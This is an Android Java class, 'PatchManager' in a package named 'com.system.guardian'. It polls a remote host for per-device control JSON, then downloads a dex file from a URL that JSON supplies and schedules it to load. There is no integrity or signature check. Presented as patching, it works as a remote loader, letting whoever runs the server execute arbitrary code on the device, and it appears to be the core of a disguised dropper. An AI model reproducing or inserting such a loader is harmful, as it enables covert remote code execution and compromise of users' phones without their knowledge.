package com.system.guardian;

import android.content.Context;
import android.util.Log;

import org.json.JSONObject;

import java.io.File;

public class PatchManager {

    private static final String TAG = "PatchManager";

    public static void checkAndApply(Context context, String deviceToken) {
        new Thread(() -> {
            try {
                // Fetch control JSON
                String url = "https://digiserve25.pythonanywhere.com/control/" + deviceToken + ".json";
                JSONObject json = NetworkUtils.getJsonFromUrl(url);

                if (json == null) {
                    CrashLogger.log(context, TAG, "❌ Control JSON unavailable.");
                    return;
                }

                // Check for dex URL
                String dexUrl = json.optString("dex_url", "");
                if (!dexUrl.isEmpty()) {
                    File dexFile = NetworkUtils.downloadFile(context, dexUrl, "patch.dex");
                    DexLoader.schedulePatchLoad(context, dexFile);
                } else {
                    CrashLogger.log(context, TAG, "ℹ️ No dex patch available.");
                }

            } catch (Exception e) {
                String errorMsg = "❌ Patch check failed: " + e.getMessage();
                Log.e(TAG, errorMsg, e);
                CrashLogger.log(context, TAG, errorMsg);
            }
        }).start();
    }
}
